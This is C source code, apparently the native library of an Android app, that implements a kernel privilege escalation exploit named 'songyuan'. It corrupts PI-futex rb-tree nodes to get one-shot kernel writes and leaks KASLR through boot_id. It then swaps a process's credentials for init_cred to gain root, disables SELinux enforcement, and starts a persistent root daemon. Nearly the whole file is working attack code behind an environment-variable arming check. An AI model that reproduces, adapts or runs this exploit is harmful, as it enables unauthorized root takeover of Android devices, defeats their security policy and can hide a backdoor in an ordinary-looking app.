#include "common.h"

/* Minimal songyuan proof.  No ashmem/configfs/SystemUI stages are linked. */
uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int cfi_stage_done;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int fake_fops_request;
atomic_int fake_fops_done;
int memfd_leak;

int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret;

#define EXP_BUF_NWORDS 16
#define CONTROL_COMM "gl-root-proof"
#define KASLR_SLIDE_MAX 0x3f00000000ULL

static atomic_int control_ready;
static atomic_int control_check;
static atomic_int control_done;
static atomic_int control_uid;
static atomic_int control_gid;
static int proof_pipe[2] = {-1, -1};
static int control_ready_pipe[2] = {-1, -1};
static int write_page_used;

struct leader_proof_shared {
  atomic_int go;
  atomic_int done;
  atomic_int finish;
  atomic_int uid;
  atomic_int gid;
  atomic_int daemon_started;
  atomic_int daemon_pid;
  atomic_int daemon_result;
  atomic_int daemon_errno;
  atomic_int enforcing_before;
  atomic_int enforcing_after;
  atomic_int setenforce_errno;
  atomic_int app_uid;
};

int tickerbar_start_daemon(uid_t app_uid);

enum {
  EXP_W_TREE_PC = 0,
  EXP_W_TREE_RIGHT = 1,
  EXP_W_TREE_LEFT = 2,
  EXP_W_TREE_PRIO = 3,
  EXP_W_TREE_DEADLINE = 4,
  EXP_W_PI_TREE_PC = 5,
  EXP_W_PI_TREE_RIGHT = 6,
  EXP_W_PI_TREE_LEFT = 7,
  EXP_W_PI_TREE_PRIO = 8,
  EXP_W_PI_TREE_DEADLINE = 9,
  EXP_W_TASK = 10,
  EXP_W_LOCK = 11,
  EXP_W_WAKE_STATE = 12,
  EXP_W_WW_CTX = 13,
};

static int kernel_ptr(uint64_t value) {
  return (value >> 48) == 0xffff;
}

static int task_list_ptr(uint64_t value) {
  if (value < DIRECT_MAP_BASE + TASK_TASKS_OFF || value >= DIRECT_MAP_END)
    return 0;
  /* task_struct instances on this target are at least 64-byte aligned.  A
   * stale boot_id.data value points into the randomized kernel image, while
   * a successful task-tail redirect must resolve to the linear/direct map. */
  return ((value - TASK_TASKS_OFF) & 0x3fULL) == 0;
}

static void abort_control_child(pid_t pid) {
  if (pid <= 0)
    return;
  (void)kill(pid, SIGKILL);
  while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {}
}

static int read_enforcing_state(void) {
  char value = '?';
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return -1;
  ssize_t n = read(fd, &value, 1);
  close(fd);
  return n == 1 && value == '0' ? 0 : n == 1 && value == '1' ? 1 : -1;
}

static void build_write_buffer(uint64_t *buf, uintptr_t target,
                               uintptr_t value, int write_shape) {
  memset(buf, 0, EXP_BUF_NWORDS * sizeof(*buf));
  if (write_shape == 1) {
    /* rb_erase(parent=target-8, right=value) writes value to target.  Its
     * collateral store lands in value[0], which is acceptable only for the
     * static init_cred usage counter used by the final proof. */
    buf[EXP_W_TREE_PC] = target - 8;
    buf[EXP_W_TREE_RIGHT] = value;
    buf[EXP_W_TREE_LEFT] = 0;
  } else {
    /* rb_erase(parent=value, left=target) writes value to target. */
    buf[EXP_W_TREE_PC] = value;
    buf[EXP_W_TREE_RIGHT] = 0;
    buf[EXP_W_TREE_LEFT] = target;
  }
  buf[EXP_W_TREE_PRIO] = 130;
  buf[EXP_W_TREE_DEADLINE] = 0;
  if (write_shape == 2) {
    /* The chain erases waiter->pi_tree_entry after tree_entry.  Use that
     * second, parentless left-child erase to write zero to init_cred's
     * uid/gid word, undoing the primary left-child erase's collateral in
     * the same sched_setattr invocation. */
    buf[EXP_W_PI_TREE_PC] = 0;
    buf[EXP_W_PI_TREE_RIGHT] = 0;
    buf[EXP_W_PI_TREE_LEFT] = value + 8;
    buf[EXP_W_PI_TREE_PRIO] = 130;
    buf[EXP_W_PI_TREE_DEADLINE] = 0;
  }
  /* 6.12 try_to_wake_up() takes waiter->task->pi_lock before checking
   * __state.  A synthetic task can therefore wedge queued_spin_lock even
   * with state==0.  Before the slide is known, use init_task's stable
   * direct-map alias; afterward use its canonical runtime address. */
  buf[EXP_W_TASK] = kaslr_done
                        ? (uintptr_t)(kaslr_base + INIT_TASK_OFF)
                        : (uintptr_t)P0_DATA_ALIAS_CONST(INIT_TASK);
  buf[EXP_W_LOCK] = fake_lock;
  buf[EXP_W_WAKE_STATE] = 0;
  buf[EXP_W_WW_CTX] = 0;
}

static int kernel_write64_once_shape(uintptr_t target, uintptr_t value,
                                     const char *stage,
                                     int write_shape) {
  if (write_page_used) {
    pr_info("songyuan refreshing one-shot write page before stage=%s\n",
            stage);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);
    if (!page_base || !fake_lock || !fake_task) {
      pr_error("songyuan page refresh failed stage=%s page=%016zx "
               "lock=%016zx task=%016zx\n",
               stage, page_base, fake_lock, fake_task);
      return 0;
    }
    pr_success("songyuan-page-refreshed stage=%s page=%016zx lock=%016zx "
               "task=%016zx\n",
               stage, page_base, fake_lock, fake_task);
    write_page_used = 0;
  }

  uint64_t buf[EXP_BUF_NWORDS];
  build_write_buffer(buf, target, value, write_shape);
  pr_info("songyuan write stage=%s target=%016zx value=%016zx page=%016zx "
          "waiter_task=%016llx lock=%016zx\n",
          stage, target, value, page_base,
          (unsigned long long)buf[EXP_W_TASK], fake_lock);
  /* The chain walk mutates the fake lock/task state.  Treat every reclaimed
   * page as one-shot even when the write fails, and refresh before the next
   * stage rather than following a stale tree pointer from the prior waiter. */
  write_page_used = 1;
  int ret = exp_stack_once(buf);
  if (ret != 0) {
    pr_error("songyuan write stage=%s failed ret=%d errno=%d\n",
             stage, ret, errno);
    return 0;
  }
  return 1;
}

static int kernel_write64_once(uintptr_t target, uintptr_t value,
                               const char *stage) {
  return kernel_write64_once_shape(target, value, stage, 0);
}

static int read_bootid_words(uint64_t words[2]) {
  char text[80];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v;
    if (text[i] >= '0' && text[i] <= '9')
      v = text[i] - '0';
    else if (text[i] >= 'a' && text[i] <= 'f')
      v = text[i] - 'a' + 10;
    else if (text[i] >= 'A' && text[i] <= 'F')
      v = text[i] - 'A' + 10;
    else
      continue;
    if (high < 0)
      high = v;
    else {
      raw[out++] = (unsigned char)((high << 4) | v);
      high = -1;
    }
  }
  if (out != 16)
    return 0;
  memcpy(words, raw, sizeof(raw));
  return 1;
}

static int accept_kaslr_words(const uint64_t words[2], const char *source) {
  if (!kernel_ptr(words[0]) || words[0] < SLIDE_NFULNL_LOGGER_IMAGE)
    return 0;
  uint64_t slide = words[0] - SLIDE_NFULNL_LOGGER_IMAGE;
  if ((slide & 0x1fffffULL) != 0 || slide > KASLR_SLIDE_MAX) {
    pr_error("songyuan kaslr slide rejected source=%s leaked=%016llx "
             "slide=%016llx\n",
             source, (unsigned long long)words[0],
             (unsigned long long)slide);
    return 0;
  }
  kaslr_slide = slide;
  kaslr_base = KIMAGE_TEXT_BASE + slide;
  kaslr_done = 1;
  slide_p0_offset = slide;
  pr_success("songyuan-kaslr-ok source=%s leaked=%016llx base=%016llx "
             "slide=%016llx\n",
             source, (unsigned long long)words[0],
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}

static void *control_thread(void *unused __attribute__((unused))) {
  (void)prctl(PR_SET_NAME, CONTROL_COMM, 0, 0, 0);
  atomic_store(&control_ready, 1);
  while (!atomic_load(&control_check))
    __asm__ volatile("yield" ::: "memory");

  uid_t uid = getuid();
  gid_t gid = getgid();
  atomic_store(&control_uid, (int)uid);
  atomic_store(&control_gid, (int)gid);

  if (uid == 0) {
    pid_t child = fork();
    if (child == 0) {
      dup2(proof_pipe[1], STDOUT_FILENO);
      dup2(proof_pipe[1], STDERR_FILENO);
      execl("/system/bin/id", "id", (char *)NULL);
      _exit(127);
    }
  }
  atomic_store(&control_done, 1);
  for (;;)
    pause();
}

static int leak_kaslr(void) {
  uint64_t words[2];
  const char *slide_env = getenv("SONGYUAN_KASLR_SLIDE");
  if (slide_env && *slide_env) {
    char *end = NULL;
    errno = 0;
    unsigned long long slide = strtoull(slide_env, &end, 0);
    if (errno || end == slide_env || *end != '\0' ||
        (slide & 0x1fffffULL) != 0 || slide > KASLR_SLIDE_MAX) {
      pr_error("songyuan invalid SONGYUAN_KASLR_SLIDE=%s\n", slide_env);
      return 0;
    }
    kaslr_slide = (uint64_t)slide;
    kaslr_base = KIMAGE_TEXT_BASE + kaslr_slide;
    kaslr_done = 1;
    slide_p0_offset = kaslr_slide;
    pr_success("songyuan-kaslr-ok source=environment base=%016llx "
               "slide=%016llx\n",
               (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }
  /* A prior proof on this boot may already have redirected boot_id.data to
   * &loggers[2][1].  Reuse that exact pointer and preserve the fresh write
   * page for the next stage. */
  if (read_bootid_words(words) && accept_kaslr_words(words, "existing"))
    return 1;

  uintptr_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA;
  /* &loggers[2][1] = (&loggers[0][1]) + 0x20. */
  uintptr_t logger_slot = SLIDE_LOGGERS_0_1 + 0x20;
  if (!kernel_write64_once(bootid_data, logger_slot, "kaslr"))
    return 0;

  if (!read_bootid_words(words)) {
    pr_error("songyuan kaslr read invalid first=%016llx second=%016llx\n",
             (unsigned long long)words[0], (unsigned long long)words[1]);
    return 0;
  }
  return accept_kaslr_words(words, "write");
}

static int root_control_thread(void) {
  /* init_task.tasks links process leaders.  Create a dedicated leader only
   * after page preparation, keep it alive, and make it identify/check itself
   * after the parent changes that exact task. */
  struct leader_proof_shared *shared = mmap(
      NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (shared == MAP_FAILED || pipe(control_ready_pipe) != 0)
    return 0;
  memset(shared, 0, sizeof(*shared));
  int daemon_mode = getenv("TICKERBAR_DAEMON") != NULL;
  if (daemon_mode) {
    const char *uid_env = getenv("TICKERBAR_ALLOWED_UID");
    char *end = NULL;
    errno = 0;
    unsigned long uid_value = uid_env ? strtoul(uid_env, &end, 10) : 0;
    if (!uid_env || errno || end == uid_env || *end != '\0' ||
        uid_value < 10000 || uid_value > UINT32_MAX) {
      pr_error("songyuan invalid TICKERBAR_ALLOWED_UID\n");
      return 0;
    }
    atomic_store(&shared->app_uid, (int)uid_value);
  }
  uintptr_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA;
  uintptr_t init_task = (uintptr_t)(kaslr_base + INIT_TASK_OFF);
  uintptr_t init_tasks_prev = init_task + TASK_TASKS_OFF + 8;
  if (!kernel_write64_once(bootid_data, init_tasks_prev, "task-tail"))
    return 0;

  /* boot_id.data now follows init_task.tasks.prev dynamically.  Fork the
   * dedicated leader only after that write has completed, then sample the
   * tail immediately; this avoids the page-search window in which unrelated
   * system workers could otherwise become the newest process. */
  pid_t control_pid = fork();
  if (control_pid < 0)
    return 0;
  if (control_pid == 0) {
    close(control_ready_pipe[0]);
    (void)prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1)
      _exit(1);
    (void)prctl(PR_SET_NAME, "glproof", 0, 0, 0);
    /* The exploit parent is pinned to CPU 0 for timing-sensitive work.  The
     * proof leader does no timing-sensitive work, so let Android place it on
     * any CPU and sleep while the parent prepares the remaining pages.  ARM's
     * `yield` instruction is only a processor hint; using it here previously
     * burned one full CPU for several minutes and starved system_server. */
    reset_cpu_pin();
    char token = 'R';
    (void)write(control_ready_pipe[1], &token, 1);
    while (!atomic_load(&shared->go))
      usleep(1000);
    uid_t uid = (uid_t)syscall(SYS_getuid);
    gid_t gid = (gid_t)syscall(SYS_getgid);
    atomic_store(&shared->uid, (int)uid);
    atomic_store(&shared->gid, (int)gid);
    if (daemon_mode && uid == 0 && gid == 0) {
      atomic_store(&shared->enforcing_before, read_enforcing_state());
      int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
      int setenforce_errno = 0;
      if (enforce_fd < 0) {
        setenforce_errno = errno;
      } else {
        if (write(enforce_fd, "0", 1) != 1)
          setenforce_errno = errno ? errno : EIO;
        close(enforce_fd);
      }
      atomic_store(&shared->setenforce_errno, setenforce_errno);
      atomic_store(&shared->enforcing_after, read_enforcing_state());
      pid_t daemon_pid = fork();
      if (daemon_pid == 0) {
        (void)setsid();
        (void)prctl(PR_SET_NAME, "tickerbar-root", 0, 0, 0);
        int nullfd = open("/dev/null", O_RDWR | O_CLOEXEC);
        if (nullfd >= 0) {
          dup2(nullfd, STDIN_FILENO);
          dup2(nullfd, STDOUT_FILENO);
          dup2(nullfd, STDERR_FILENO);
        }
        for (int fd = 3; fd < 65536; ++fd)
          close(fd);
        errno = 0;
        int daemon_result = tickerbar_start_daemon(
            (uid_t)atomic_load(&shared->app_uid));
        atomic_store(&shared->daemon_result, daemon_result);
        atomic_store(&shared->daemon_errno, errno);
        _exit(daemon_result == 0 ? 0 : 1);
      }
      atomic_store(&shared->daemon_pid, (int)daemon_pid);
      for (int i = 0; i < 1000; ++i) {
        if (access("/data/local/tmp/tickerbar-root.sock", F_OK) == 0) {
          atomic_store(&shared->daemon_started, 1);
          break;
        }
        usleep(10000);
      }
    }
    atomic_store(&shared->done, 1);
    while (!atomic_load(&shared->finish))
      usleep(1000);
    _exit(uid == 0 ? 0 : 1);
  }
  close(control_ready_pipe[1]);
  char ready;
  if (read(control_ready_pipe[0], &ready, 1) != 1) {
    abort_control_child(control_pid);
    return 0;
  }

  uint64_t list[2] = {0, 0};
  if (!read_bootid_words(list) || !task_list_ptr(list[0])) {
    pr_error("songyuan task-tail rejected prev=%016llx adjacent=%016llx "
             "expected-direct-map=%016llx..%016llx\n",
             (unsigned long long)list[0], (unsigned long long)list[1],
             (unsigned long long)DIRECT_MAP_BASE,
             (unsigned long long)DIRECT_MAP_END);
    abort_control_child(control_pid);
    return 0;
  }
  uintptr_t task = (uintptr_t)list[0] - TASK_TASKS_OFF;
  pr_success("songyuan-task-tail prev=%016llx adjacent=%016llx task=%016zx\n",
             (unsigned long long)list[0], (unsigned long long)list[1], task);

  /* Confirm that init_task.tasks.prev resolved to this executable's process
   * leader.  The left-child primitive's collateral store changes comm[8..15],
   * so only validate the untouched first eight bytes. */
  if (!kernel_write64_once(bootid_data, task + TASK_COMM_OFF, "task-comm")) {
    abort_control_child(control_pid);
    return 0;
  }
  uint64_t comm_words[2];
  if (!read_bootid_words(comm_words)) {
    abort_control_child(control_pid);
    return 0;
  }
  char comm_prefix[9];
  memcpy(comm_prefix, comm_words, 8);
  comm_prefix[8] = '\0';
  pr_success("songyuan-task-identity task=%016zx comm-prefix=%s raw=%016llx\n",
             task, comm_prefix, (unsigned long long)comm_words[0]);
  if (memcmp(comm_prefix, "glproof", 7) != 0) {
    pr_error("songyuan task identity mismatch; refusing cred write\n");
    atomic_store(&shared->go, 1);
    while (!atomic_load(&shared->done))
      usleep(1000);
    atomic_store(&shared->finish, 1);
    while (waitpid(control_pid, NULL, 0) < 0 && errno == EINTR) {}
    return 0;
  }

  /* Pre-stage independently pinned pages while this parent still has its
   * normal shell credentials.  Page A performs the proven left-child cred
   * switch.  Page B repairs the init_cred collateral.  The rooted child
   * changes enforcement through selinuxfs, which updates SELinux coherently
   * and avoids overwriting adjacent bytes in struct selinux_state. */
  uintptr_t init_cred = (uintptr_t)(kaslr_base + INIT_CRED_OFF);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);
  if (!page_base || !fake_lock || !fake_task)
    return 0;
  uintptr_t page_a = page_base;
  uintptr_t lock_a = fake_lock;
  uintptr_t task_a = fake_task;

  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);
  if (!page_base || !fake_lock || !fake_task)
    return 0;
  uintptr_t page_b = page_base;
  uintptr_t lock_b = fake_lock;
  uintptr_t task_b = fake_task;
  pr_success("songyuan-prestaged cred-page=%016zx repair-page=%016zx\n",
             page_a, page_b);

  page_base = page_a;
  fake_lock = lock_a;
  fake_task = task_a;
  write_page_used = 0;
  if (!kernel_write64_once_shape(task + TASK_CRED_OFF, init_cred,
                                 "cred-switch", 0))
    return 0;

  page_base = page_b;
  fake_lock = lock_b;
  fake_task = task_b;
  write_page_used = 0;
  if (!kernel_write64_once_shape(init_cred + 8, 0,
                                 "cred-collateral-restore", 1))
    return 0;

  atomic_store(&shared->go, 1);
  for (int i = 0; i < 100000 && !atomic_load(&shared->done); i++)
    usleep(100);
  int proof_uid = atomic_load(&shared->uid);
  int proof_gid = atomic_load(&shared->gid);
  int proof_done = atomic_load(&shared->done);
  int daemon_started = atomic_load(&shared->daemon_started);
  int daemon_pid = atomic_load(&shared->daemon_pid);
  int daemon_result = atomic_load(&shared->daemon_result);
  int daemon_errno = atomic_load(&shared->daemon_errno);
  int enforcing_before = atomic_load(&shared->enforcing_before);
  int enforcing_after = atomic_load(&shared->enforcing_after);
  int setenforce_errno = atomic_load(&shared->setenforce_errno);
  atomic_store(&shared->finish, 1);
  int status = 0;
  while (waitpid(control_pid, &status, 0) < 0 && errno == EINTR) {}
  int rooted = proof_done && proof_uid == 0 && WIFEXITED(status) &&
               WEXITSTATUS(status) == 0 && (!daemon_mode || daemon_started);
  atomic_store(&control_uid, proof_uid);
  atomic_store(&control_gid, proof_gid);
  pr_success("songyuan-root-proof rooted=%d uid=%d gid=%d status=%d "
             "daemon=%d daemon_pid=%d daemon_result=%d daemon_errno=%d "
             "enforce=%d->%d setenforce_errno=%d\n",
             rooted, proof_uid, proof_gid, status, daemon_started, daemon_pid,
             daemon_result, daemon_errno, enforcing_before, enforcing_after,
             setenforce_errno);
  return rooted;
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;
  /* Defense in depth for packaged builds.  The Android UI currently keeps
   * root attempts disabled, but the native library must also be inert if it
   * is invoked directly or by a stale launcher.  Deliberate test commands
   * can arm one process explicitly after the page-reclaim design is ready. */
  const char *armed = getenv("TICKERBAR_ROOT_ARMED");
  if (!armed || strcmp(armed, "1") != 0) {
    pr_error("songyuan root module is safety-locked; "
             "TICKERBAR_ROOT_ARMED=1 is required\n");
    return 2;
  }
  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  unsigned int timeout_sec = 1200;
  const char *timeout_env = getenv("TICKERBAR_ROOT_TIMEOUT_SEC");
  if (timeout_env && *timeout_env) {
    char *end = NULL;
    errno = 0;
    unsigned long parsed = strtoul(timeout_env, &end, 10);
    if (!errno && end != timeout_env && *end == '\0' &&
        parsed >= 60 && parsed <= 3600)
      timeout_sec = (unsigned int)parsed;
  }
  alarm(timeout_sec);
  pr_info("songyuan safety timeout=%u seconds\n", timeout_sec);
  pin_to_core(CORE);

  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);
  if (!page_base || !fake_lock || !fake_task) {
    pr_error("songyuan page preparation failed page=%016zx lock=%016zx "
             "task=%016zx\n", page_base, fake_lock, fake_task);
    return 1;
  }
  pr_success("songyuan-page-ready page=%016zx lock=%016zx task=%016zx\n",
             page_base, fake_lock, fake_task);
  write_page_used = 0;

  if (!leak_kaslr())
    return 1;
  if (getenv("REPAIR_INIT_CRED")) {
    uintptr_t init_cred = (uintptr_t)(kaslr_base + INIT_CRED_OFF);
    int repaired = kernel_write64_once_shape(init_cred + 8, 0,
                                             "repair-init-cred-uidgid", 1);
    pr_success("songyuan-init-cred-repair repaired=%d target=%016zx\n",
               repaired, init_cred + 8);
    return repaired ? 0 : 1;
  }
  if (getenv("SLIDE_ONLY"))
    return 0;

  int rooted = root_control_thread();
  alarm(0);
  pr_success("songyuan-final rooted=%d uid=%d gid=%d base=%016llx\n",
             rooted, atomic_load(&control_uid), atomic_load(&control_gid),
             (unsigned long long)kaslr_base);
  return rooted ? 0 : 1;
}
